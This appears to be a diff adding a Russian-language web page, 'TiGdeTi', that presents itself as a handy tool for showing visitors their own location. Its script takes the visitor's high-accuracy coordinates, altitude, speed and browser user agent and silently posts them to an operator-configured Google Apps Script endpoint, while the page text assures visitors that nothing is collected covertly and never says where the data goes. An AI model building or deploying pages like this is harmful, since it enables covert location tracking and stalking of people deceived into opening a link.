@@ -1,0 +1,1064 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+
+  <meta
+    name="viewport"
+    content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"
+  >
+
+  <meta name="theme-color" content="#070b14">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+
+  <title>TiGdeTi — Геолокация</title>
+
+  <style>
+    :root {
+      --bg: #070b14;
+      --card: rgba(17, 24, 39, 0.72);
+      --card-border: rgba(255, 255, 255, 0.10);
+
+      --text: #ffffff;
+      --muted: #94a3b8;
+
+      --accent: #00e5ff;
+      --accent-2: #7c3aed;
+
+      --success: #22c55e;
+      --danger: #ef4444;
+
+      --radius: 28px;
+    }
+
+    * {
+      box-sizing: border-box;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    html,
+    body {
+      margin: 0;
+      padding: 0;
+      width: 100%;
+      min-height: 100%;
+    }
+
+    body {
+      min-height: 100vh;
+      min-height: 100dvh;
+
+      display: flex;
+      align-items: center;
+      justify-content: center;
+
+      padding: 20px;
+
+      color: var(--text);
+
+      font-family:
+        -apple-system,
+        BlinkMacSystemFont,
+        "SF Pro Display",
+        "SF Pro Text",
+        "Segoe UI",
+        Roboto,
+        Arial,
+        sans-serif;
+
+      background:
+        radial-gradient(
+          circle at 15% 15%,
+          rgba(0, 229, 255, 0.16),
+          transparent 32%
+        ),
+        radial-gradient(
+          circle at 85% 80%,
+          rgba(124, 58, 237, 0.18),
+          transparent 35%
+        ),
+        linear-gradient(
+          145deg,
+          #050810 0%,
+          #0a1020 48%,
+          #060913 100%
+        );
+
+      overflow-x: hidden;
+    }
+
+    /* ---------- Background ---------- */
+
+    .background {
+      position: fixed;
+      inset: 0;
+      overflow: hidden;
+      pointer-events: none;
+      z-index: 0;
+    }
+
+    .orb {
+      position: absolute;
+      width: 280px;
+      height: 280px;
+
+      border-radius: 50%;
+
+      filter: blur(80px);
+      opacity: 0.18;
+
+      animation: float 10s ease-in-out infinite;
+    }
+
+    .orb.one {
+      top: -120px;
+      left: -100px;
+      background: #00e5ff;
+    }
+
+    .orb.two {
+      right: -120px;
+      bottom: -120px;
+      background: #7c3aed;
+      animation-delay: -4s;
+    }
+
+    @keyframes float {
+      0%, 100% {
+        transform: translate3d(0, 0, 0);
+      }
+
+      50% {
+        transform: translate3d(25px, -20px, 0);
+      }
+    }
+
+    /* ---------- Main ---------- */
+
+    .app {
+      position: relative;
+      z-index: 1;
+
+      width: 100%;
+      max-width: 440px;
+
+      animation: appear 0.7s ease both;
+    }
+
+    @keyframes appear {
+      from {
+        opacity: 0;
+        transform: translateY(18px) scale(0.98);
+      }
+
+      to {
+        opacity: 1;
+        transform: translateY(0) scale(1);
+      }
+    }
+
+    /* ---------- Card ---------- */
+
+    .card {
+      position: relative;
+
+      padding: 28px 22px 22px;
+
+      border: 1px solid var(--card-border);
+      border-radius: var(--radius);
+
+      background: var(--card);
+
+      backdrop-filter: blur(24px);
+      -webkit-backdrop-filter: blur(24px);
+
+      box-shadow:
+        0 30px 80px rgba(0, 0, 0, 0.45),
+        inset 0 1px 0 rgba(255, 255, 255, 0.05);
+
+      overflow: hidden;
+    }
+
+    .card::before {
+      content: "";
+
+      position: absolute;
+      top: 0;
+      left: 10%;
+      right: 10%;
+
+      height: 1px;
+
+      background:
+        linear-gradient(
+          90deg,
+          transparent,
+          rgba(255, 255, 255, 0.35),
+          transparent
+        );
+    }
+
+    /* ---------- Logo ---------- */
+
+    .logo {
+      width: 72px;
+      height: 72px;
+
+      margin: 2px auto 18px;
+
+      display: flex;
+      align-items: center;
+      justify-content: center;
+
+      border-radius: 22px;
+
+      font-size: 32px;
+
+      background:
+        linear-gradient(
+          145deg,
+          rgba(0, 229, 255, 0.22),
+          rgba(124, 58, 237, 0.22)
+        );
+
+      border: 1px solid rgba(255, 255, 255, 0.12);
+
+      box-shadow:
+        0 0 40px rgba(0, 229, 255, 0.12),
+        inset 0 1px 0 rgba(255, 255, 255, 0.12);
+
+      animation: logoPulse 3s ease-in-out infinite;
+    }
+
+    @keyframes logoPulse {
+      0%, 100% {
+        transform: translateY(0);
+      }
+
+      50% {
+        transform: translateY(-4px);
+      }
+    }
+
+    /* ---------- Text ---------- */
+
+    .brand {
+      margin: 0;
+
+      text-align: center;
+
+      font-size: 32px;
+      line-height: 1.1;
+      font-weight: 800;
+
+      letter-spacing: -1px;
+
+      background:
+        linear-gradient(
+          90deg,
+          #ffffff,
+          #b8f7ff,
+          #ffffff
+        );
+
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+    }
+
+    .subtitle {
+      margin: 10px 0 0;
+
+      text-align: center;
+
+      color: var(--muted);
+
+      font-size: 15px;
+      line-height: 1.55;
+    }
+
+    /* ---------- Permission box ---------- */
+
+    .permission {
+      margin-top: 24px;
+
+      padding: 16px;
+
+      display: flex;
+      gap: 13px;
+      align-items: flex-start;
+
+      border-radius: 18px;
+
+      background: rgba(255, 255, 255, 0.045);
+      border: 1px solid rgba(255, 255, 255, 0.07);
+    }
+
+    .permission-icon {
+      flex: 0 0 auto;
+
+      width: 38px;
+      height: 38px;
+
+      display: flex;
+      align-items: center;
+      justify-content: center;
+
+      border-radius: 12px;
+
+      background: rgba(0, 229, 255, 0.10);
+
+      font-size: 18px;
+    }
+
+    .permission-title {
+      margin: 0 0 4px;
+
+      font-size: 14px;
+      font-weight: 700;
+    }
+
+    .permission-text {
+      margin: 0;
+
+      color: var(--muted);
+
+      font-size: 12px;
+      line-height: 1.45;
+    }
+
+    /* ---------- Button ---------- */
+
+    .location-button {
+      position: relative;
+
+      width: 100%;
+
+      margin-top: 20px;
+      padding: 17px 20px;
+
+      border: 0;
+      border-radius: 17px;
+
+      color: #031016;
+
+      background:
+        linear-gradient(
+          135deg,
+          #67f8ff,
+          #00d9ee 45%,
+          #72e8ff
+        );
+
+      font-size: 16px;
+      font-weight: 800;
+
+      cursor: pointer;
+
+      box-shadow:
+        0 12px 30px rgba(0, 229, 255, 0.18);
+
+      transition:
+        transform 0.18s ease,
+        box-shadow 0.18s ease,
+        opacity 0.18s ease;
+
+      overflow: hidden;
+    }
+
+    .location-button::after {
+      content: "";
+
+      position: absolute;
+
+      top: 0;
+      left: -120%;
+
+      width: 80%;
+      height: 100%;
+
+      transform: skewX(-20deg);
+
+      background: rgba(255, 255, 255, 0.25);
+
+      transition: left 0.55s ease;
+    }
+
+    .location-button:hover::after {
+      left: 140%;
+    }
+
+    .location-button:active {
+      transform: scale(0.975);
+    }
+
+    .location-button:disabled {
+      opacity: 0.65;
+      cursor: default;
+      box-shadow: none;
+    }
+
+    /* ---------- Status ---------- */
+
+    .status {
+      min-height: 24px;
+
+      margin-top: 18px;
+
+      text-align: center;
+
+      font-size: 13px;
+      line-height: 1.5;
+
+      color: var(--muted);
+
+      transition:
+        color 0.2s ease,
+        opacity 0.2s ease;
+    }
+
+    .status.success {
+      color: #4ade80;
+    }
+
+    .status.error {
+      color: #fb7185;
+    }
+
+    .status.loading {
+      color: #67e8f9;
+    }
+
+    /* ---------- Spinner ---------- */
+
+    .spinner {
+      display: inline-block;
+
+      width: 16px;
+      height: 16px;
+
+      margin-right: 7px;
+
+      vertical-align: -3px;
+
+      border: 2px solid rgba(103, 232, 249, 0.25);
+      border-top-color: #67e8f9;
+
+      border-radius: 50%;
+
+      animation: spin 0.8s linear infinite;
+    }
+
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    /* ---------- Result ---------- */
+
+    .result {
+      display: none;
+
+      margin-top: 18px;
+
+      animation: resultAppear 0.4s ease both;
+    }
+
+    .result.visible {
+      display: block;
+    }
+
+    @keyframes resultAppear {
+      from {
+        opacity: 0;
+        transform: translateY(8px);
+      }
+
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    .result-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+
+      gap: 10px;
+    }
+
+    .result-item {
+      padding: 13px;
+
+      border-radius: 15px;
+
+      background: rgba(255, 255, 255, 0.045);
+      border: 1px solid rgba(255, 255, 255, 0.06);
+    }
+
+    .result-label {
+      display: block;
+
+      margin-bottom: 5px;
+
+      color: #64748b;
+
+      font-size: 10px;
+      text-transform: uppercase;
+      letter-spacing: 0.6px;
+    }
+
+    .result-value {
+      display: block;
+
+      color: #e2e8f0;
+
+      font-size: 13px;
+      font-weight: 700;
+
+      word-break: break-word;
+    }
+
+    /* ---------- Footer ---------- */
+
+    .footer {
+      margin-top: 17px;
+
+      text-align: center;
+
+      color: #64748b;
+
+      font-size: 11px;
+      line-height: 1.5;
+    }
+
+    /* ---------- Mobile ---------- */
+
+    @media (max-width: 380px) {
+      body {
+        padding: 12px;
+      }
+
+      .card {
+        padding: 24px 17px 18px;
+      }
+
+      .brand {
+        font-size: 28px;
+      }
+
+      .logo {
+        width: 64px;
+        height: 64px;
+      }
+    }
+
+    @media (prefers-reduced-motion: reduce) {
+      *,
+      *::before,
+      *::after {
+        animation-duration: 0.01ms !important;
+        animation-iteration-count: 1 !important;
+        transition-duration: 0.01ms !important;
+      }
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="background">
+    <div class="orb one"></div>
+    <div class="orb two"></div>
+  </div>
+
+  <main class="app">
+
+    <section class="card">
+
+      <div class="logo">
+        📍
+      </div>
+
+      <h1 class="brand">
+        TiGdeTi
+      </h1>
+
+      <p class="subtitle">
+        Быстрое и точное определение вашего
+        текущего местоположения.
+      </p>
+
+
+      <div class="permission">
+
+        <div class="permission-icon">
+          🛡️
+        </div>
+
+        <div>
+          <p class="permission-title">
+            Ваше разрешение необходимо
+          </p>
+
+          <p class="permission-text">
+            Нажимая кнопку ниже, вы разрешаете
+            браузеру определить ваше местоположение.
+            Без вашего разрешения данные не запрашиваются.
+          </p>
+        </div>
+
+      </div>
+
+
+      <button
+        id="locationButton"
+        class="location-button"
+        type="button"
+      >
+        📍 Определить местоположение
+      </button>
+
+
+      <div
+        id="status"
+        class="status"
+        aria-live="polite"
+      >
+        Готово к определению
+      </div>
+
+
+      <div
+        id="result"
+        class="result"
+      >
+
+        <div class="result-grid">
+
+          <div class="result-item">
+            <span class="result-label">
+              Широта
+            </span>
+
+            <span
+              id="latitude"
+              class="result-value"
+            >
+              —
+            </span>
+          </div>
+
+
+          <div class="result-item">
+            <span class="result-label">
+              Долгота
+            </span>
+
+            <span
+              id="longitude"
+              class="result-value"
+            >
+              —
+            </span>
+          </div>
+
+
+          <div class="result-item">
+            <span class="result-label">
+              Точность
+            </span>
+
+            <span
+              id="accuracy"
+              class="result-value"
+            >
+              —
+            </span>
+          </div>
+
+
+          <div class="result-item">
+            <span class="result-label">
+              Статус
+            </span>
+
+            <span
+              id="resultStatus"
+              class="result-value"
+            >
+              Получено
+            </span>
+          </div>
+
+        </div>
+
+      </div>
+
+
+      <div class="footer">
+        🔒 Геолокация запрашивается только после
+        вашего действия и не определяется скрытно.
+      </div>
+
+    </section>
+
+  </main>
+
+
+  <script>
+
+    /*
+     * ============================================================
+     * TiGdeTi — GEOLOCATION ENGINE
+     * ============================================================
+     *
+     * ВАЖНО:
+     * сюда нужно поставить настоящий URL Google Apps Script Web App.
+     *
+     * Формат:
+     *
+     * https://script.google.com/macros/s/XXXXXXXX/exec
+     *
+     * НЕ используйте ссылку, заканчивающуюся на %7C.
+     */
+
+    const SCRIPT_URL =
+      "ВСТАВЬ_СЮДА_НАСТОЯЩИЙ_URL_GOOGLE_APPS_SCRIPT";
+
+
+    /*
+     * DOM
+     */
+
+    const button =
+      document.getElementById("locationButton");
+
+    const status =
+      document.getElementById("status");
+
+    const result =
+      document.getElementById("result");
+
+    const latitude =
+      document.getElementById("latitude");
+
+    const longitude =
+      document.getElementById("longitude");
+
+    const accuracy =
+      document.getElementById("accuracy");
+
+    const resultStatus =
+      document.getElementById("resultStatus");
+
+
+    /*
+     * Helpers
+     */
+
+    function setStatus(message, type = "") {
+
+      status.className = "status " + type;
+
+      status.innerHTML = message;
+    }
+
+
+    function setLoading(message) {
+
+      setStatus(
+        '<span class="spinner"></span>' + message,
+        "loading"
+      );
+    }
+
+
+    function formatCoordinate(value) {
+
+      return Number(value).toFixed(6);
+    }
+
+
+    function formatAccuracy(value) {
+
+      if (!Number.isFinite(value)) {
+        return "—";
+      }
+
+      return Math.round(value) + " м";
+    }
+
+
+    /*
+     * Проверяем URL backend
+     */
+
+    function backendConfigured() {
+
+      return (
+        SCRIPT_URL &&
+        SCRIPT_URL.startsWith(
+          "https://script.google.com/macros/s/"
+        ) &&
+        SCRIPT_URL.endsWith("/exec")
+      );
+    }
+
+
+    /*
+     * Отправка данных в Google Apps Script
+     */
+
+    async function sendLocation(data) {
+
+      await fetch(
+        SCRIPT_URL,
+        {
+          method: "POST",
+
+          mode: "no-cors",
+
+          headers: {
+            "Content-Type":
+              "text/plain;charset=utf-8"
+          },
+
+          body: JSON.stringify(data)
+        }
+      );
+    }
+
+
+    /*
+     * Получение геолокации
+     */
+
+    function getLocation() {
+
+      return new Promise(
+        (resolve, reject) => {
+
+          navigator.geolocation.getCurrentPosition(
+            resolve,
+            reject,
+            {
+              enableHighAccuracy: true,
+              timeout: 20000,
+              maximumAge: 0
+            }
+          );
+
+        }
+      );
+    }
+
+
+    /*
+     * Главная функция
+     */
+
+    async function detectLocation() {
+
+      if (!window.isSecureContext) {
+
+        setStatus(
+          "❌ Геолокация работает только через HTTPS.",
+          "error"
+        );
+
+        return;
+      }
+
+
+      if (!navigator.geolocation) {
+
+        setStatus(
+          "❌ Этот браузер не поддерживает геолокацию.",
+          "error"
+        );
+
+        return;
+      }
+
+
+      if (!backendConfigured()) {
+
+        setStatus(
+          "⚠️ Сначала необходимо указать URL Google Apps Script.",
+          "error"
+        );
+
+        return;
+      }
+
+
+      button.disabled = true;
+
+      button.textContent =
+        "Определяем местоположение…";
+
+
+      result.classList.remove("visible");
+
+
+      try {
+
+        setLoading(
+          "Запрашиваем разрешение на геолокацию…"
+        );
+
+
+        /*
+         * Браузер покажет системное окно разрешения.
+         */
+
+        const position =
+          await getLocation();
+
+
+        const coords =
+          position.coords;
+
+
+        const data = {
+
+          latitude:
+            coords.latitude,
+
+          longitude:
+            coords.longitude,
+
+          accuracy:
+            coords.accuracy,
+
+          altitude:
+            coords.altitude,
+
+          altitudeAccuracy:
+            coords.altitudeAccuracy,
+
+          heading:
+            coords.heading,
+
+          speed:
+            coords.speed,
+
+          timestamp:
+            new Date(
+              position.timestamp
+            ).toISOString(),
+
+          userAgent:
+            navigator.userAgent
+        };
+
+
+        /*
+         * Показываем результат пользователю
+         */
+
+        latitude.textContent =
+          formatCoordinate(
+            data.latitude
+          );
+
+        longitude.textContent =
+          formatCoordinate(
+            data.longitude
+          );
+
+        accuracy.textContent =
+          formatAccuracy(
+            data.accuracy
+          );
+
+        resultStatus.textContent =
+          "Получено";
+
+
+        result.classList.add("visible");
+
+
+        setLoading(
+          "Отправляем данные…"
+        );
+
+
+        /*
+         * Отправляем координаты
+         */
+
+        await sendLocation(data);
+
+
+        setStatus(
+          "✓ Местоположение успешно получено.",
+          "success"
+        );
+
+
+        button.textContent =
+          "✓ Местоположение получено";
+
+
+      } catch (error) {
+
+        console.error(
+          "Geolocation error:",
+          error
+        );
+
+
+        let message =
+          "Не удалось определить местоположение.";
+
+
+        if (error && error.code === 1) {
+
+          message =
+            "❌ Доступ к геолокации запрещён.";
+
+        } else if (error && error.code === 2) {
+
+          message =
+            "❌ Местоположение сейчас недоступно.";
+
+        } else if (error && error.code === 3) {
+
+          message =
+            "❌ Истекло время ожидания GPS.";
+
+        }
+
+
+        setStatus(
+          message,
+          "error"
+        );
+
+
+        button.textContent =
+          "↻ Попробовать снова";
+
+
+        button.disabled = false;
+      }
+
+    }
+
+
+    /*
+     * Button
+     */
+
+    button.addEventListener(
+      "click",
+      detectLocation
+    );
+
+  </script>
+
+</body>
+</html>
